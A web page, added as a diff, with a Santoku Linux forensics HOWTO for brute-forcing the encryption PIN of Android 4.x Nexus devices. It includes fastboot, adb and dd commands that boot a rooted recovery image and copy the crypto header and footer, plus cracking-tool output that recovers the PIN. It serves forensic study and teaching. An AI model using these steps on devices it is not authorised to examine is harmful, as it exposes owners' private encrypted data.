@@ -1,0 +1,157 @@
+---
+layout: page
+status: publish
+published: true
+title: HOWTO Brute Force Android Encryption on Santoku Linux
+permalink: /howto/mobile-forensics/how-to-brute-force-android-encryption/
+---
+
+<div class="main-area">
+
+  <div class="tools">
+    <div class="holder">
+      <div class="frame">
+        <h1>How Tos</h1>
+        <p class="breadcrumb"><a href="/">Home</a><a href="/howtos/">How Tos</a><span class='current_crumb'>HOWTO Brute Force Android Encryption on Santoku Linux </span></p>
+      </div> 
+    </div> 
+  </div> 
+
+
+<div class="main-holder">
+<div id="content" class="content_blog">
+<div class="single_blog_wrap">
+<div class="post_title">
+<h2>HOWTO Brute Force Android Encryption on Santoku Linux</h2>
+</div> 
+
+<p><a name="top"></a><br/>
+This HOWTO will guide you through the process of cracking the pin used to encrypt an Android device (Ice Cream Sandwich and Jelly Bean) using brute force on Santoku Linux Community edition.</p>
+<h3><a name="toc"></a>Contents</h3>
+<ul>
+<li><a href="#what-you-will-need">What you will need</a></li>
+<li><a href="#putting-your-device-into-fastboot-mode">Putting your device in &#8216;Fastboot&#8217; mode</a></li>
+<li><a href="#boot-to-recovery-image">Boot to a recovery image</a></li>
+<li><a href="#pull-header-footer-files">Pull the required header and footer files</a></li>
+<li><a href="#run-brute-force">Run the Brute Force encryption program</a></li>
+<li><a href="#contribute">Contribute cycles</a></li>
+<li><a href="#revision-history">Revision History</a></li>
+</ul>
+<h4><a name="what-you-will-need"></a>What you will need:</h4>
+<ul>
+<li>Santoku &#8211; Alpha 0.3 (or later)</li>
+<li>Android Brute Force Encryption tool (bundled)</li>
+<li>A Samsung Galaxy Nexus or Galaxy S (The device must be Android version 4.0 or higher with an unlocked bootloader)</li>
+<li>An Android recovery image that allows you root access</li>
+</ul>
+<h4><a name="putting-your-device-into-fastboot-mode"></a>Put your phone in fastboot mode.</h4>
+<p>First, we need to put the phone in recovery mode so we can boot the custom recovery image. If your device already has a custom recovery image with root address installed, you can skip this step.</p>
+<p>There&#8217;s and easy way to accomplish this (adb) and a more difficult one (Vulcan death grip). If you have a device with adb enabled, simply connect it to Santoku (make sure you pass it through if running in a VM), run an LXTerminal and issue this command:</p>
+<pre>adb reboot bootloader</pre>
+<p>&nbsp;</p>
+<p>Otherwise, you can use various keys combinations to access fastboot.</p>
+<p><strong>Nexus S</strong></p>
+<ol>
+<li>Turn the device off</li>
+<li>Press and hold the <em>volume up</em> button</li>
+<li>Press and hold the power button</li>
+</ol>
+<p><strong>Galaxy Nexus</strong></p>
+<ol>
+<li>Turn the device off</li>
+<li>Press and hold the <em>both volume</em> buttons</li>
+<li>Press the power button</li>
+</ol>
+<p>After completing this step, you should see a screen like this (serial number blurred for security):</p>
+<p><img class="alignnone size-full wp-image-1372" title="FastbootMode" src="/wp-content/uploads/FastbootMode.jpg" alt="" width="280"/></p>
+<p><a href="#top">Top</a></p>
+<h4><a name="boot-to-recovery-image"></a>Boot to a recovery image</h4>
+<p>Next, we&#8217;ll boot the device from a rooted recovery image. For this guide, we used <a href="http://www.clockworkmod.com/rommanager" onclick="javascript:_gaq.push(['_trackEvent','outbound-article','http://www.clockworkmod.com/rommanager']);" target="_new">Clockwork Mod</a> but you can use any device compatible recovery image with root and adbd enabled. Note where you saved the recovery image. For this example, we placed the image in the Downloads directory.</p>
+<p>From an LxTerminal, we&#8217;ll run fastboot and make sure we can communicate with the device:</p>
+<pre>cd /opt/santoku/fastboot
+./fastboot-linux-i386 devices</pre>
+<p>&nbsp;</p>
+<p>You should see the device serial number as follows:</p>
+<pre>1234BD156E7890EC	fastboot</pre>
+<p>&nbsp;</p>
+<p>If you do not see this, make sure the device is connected and passed through if you are running in a VM. Also, for some devices, you may need to run fastboot as root if see the following:</p>
+<pre>????????????	fastboot</pre>
+<p>&nbsp;</p>
+<p>In that case, try the following:</p>
+<pre>sudo ./fastboot-linux-i386 devices</pre>
+<p>&nbsp;</p>
+<p>If this works, preface future fastboot commands with sudo as well.</p>
+<p>Now that we&#8217;ve verified we can communicate with the device over fastboot, let&#8217;s boot using the recovery image:</p>
+<pre>./fastboot-linux-i386 boot ~/Downloads/recovery-clockwork-6.0.1.0-crespo4g.img</pre>
+<p>&nbsp;</p>
+<p>Which should reboot the device into your recovery image. The output to the terminal looks as follows:</p>
+<pre>downloading 'boot.img'... OKAY
+booting... OKAY</pre>
+<p><a href="#top">Top</a></p>
+<h4><a name="pull-header-footer-files"></a>Pull the required header and footer files</h4>
+<p>Your devices should be sitting in recovery mode now. Next, we are going to pull the needed header and footer data so we can brute force the encryption pin. The location varies by device so choose the steps for your particular device type.</p>
+<p><strong>Nexus S</strong><br/>
+<em>Header</em></p>
+<pre>adb shell dd if=/dev/block/mmcblk0p2 of=tmp_header bs=512 count=1
+adb pull tmp_header ~/Desktop/tmp_header</pre>
+<p>&nbsp;</p>
+<p><em>Footer</em></p>
+<pre>adb shell mkdir /efs
+adb shell mount -t yaffs2 /dev/block/mtdblock6 /efs
+adb pull /efs/userdata_footer ~/Desktop/tmp_footer</pre>
+<p>&nbsp;</p>
+<p><strong>Galaxy Nexus</strong><br/>
+<em>Header</em></p>
+<pre>adb shell dd if=/dev/block/mmcblk0p12 of=tmp_header bs=512 count=1
+adb pull tmp_header ~/Desktop/tmp_header</pre>
+<p>&nbsp;</p>
+<p><em>Footer</em></p>
+<pre>adb shell dd if=/dev/block/mmcblk0p13 of=tmp_footer
+adb pull tmp_footer ~/Desktop/tmp_footer</pre>
+<p><a href="#top">Top</a></p>
+<h4><a name="run-brute-force"></a>Run the Android Brute Force Encryption program:</h4>
+<p>We now have everything thing we need so we&#8217;ll run the Android Brute Force Encryption cracking program against the header and footer files. By default, we test 4-digit numeric passcodes but you can change the number of digits to test. To run the program, launch it under Santoku &#8211;&gt; Device Forensics &#8211;&gt; Android Brute Force Encryption. Then run it against the header and footer files:</p>
+<pre>bruteforce_stdcrypto ~/Desktop/tmp_header ~/Desktop/tmp_footer</pre>
+<p>&nbsp;</p>
+<p>The program will output information about the footer file and then brute force the password:</p>
+<pre>Defaulting max PIN digits to 4
+Footer File    : /home/santoku/Desktop/tmp_footer
+Magic          : 0xD0B5B1C4
+Major Version  : 1
+Minor Version  : 0
+Footer Size    : 104 bytes
+Flags          : 0x00000000
+Key Size       : 128 bits
+Failed Decrypts: 0
+Crypto Type    : aes-cbc-essiv:sha256
+Encrypted Key  : 0xE51861649D0005F874AD6CCAB6DF2C61
+Salt           : 0xA163525990AC7A053E1E372914999BE8
+----------------
+Trying to Bruteforce Password... please wait
+Trying: 0000
+Trying: 0001
+Trying: 0002
+Trying: 0003
+
+Trying: 6426
+Trying: 6427
+Trying: 6428
+Found PIN!: 6428</pre>
+<p>&nbsp;</p>
+<p>This took just over 45 seconds while running Santoku in a VM. You can now use the passcode to boot the device and access the encrypted data.</p>
+<p><a href="#top">Top</a></p>
+<h4><a name="contribute"></a>Contribute cycles</h4>
+<p><a href="https://viaforensics.com/" onclick="javascript:_gaq.push(['_trackEvent','outbound-article','http://viaforensics.com/']);" target="_new">viaForensics</a> released this code open source to the community at our <a href="https://viaforensics.com/mobile-security-category/droid-gaining-access-android-user-data.html" onclick="javascript:_gaq.push(['_trackEvent','outbound-article','http://viaforensics.com/mobile-security-category/droid-gaining-access-android-user-data.html']);" target="_new">DefCon 20 talk</a>. If you have time and skills, there&#8217;s plenty more to do such as:</p>
+<ul>
+<li>Expanding beyond numeric passcodes</li>
+<li>Decrypt the raw file system</li>
+<li>Speed optimizations</li>
+</ul>
+<p>The code is hosted on the <a href="https://github.com/santoku/Santoku-Linux/tree/master/tools/android/android_bruteforce_stdcrypto" onclick="javascript:_gaq.push(['_trackEvent','outbound-article','http://github.com/santoku/Santoku-Linux/tree/master/tools/android/android_bruteforce_stdcrypto']);" target="_new">Santoku Linux GitHub account</a>.<br/>
+<a href="#top">Top</a></p>
+
+      </div> 
+    </div> 
+  </div> 
+
+</div> 
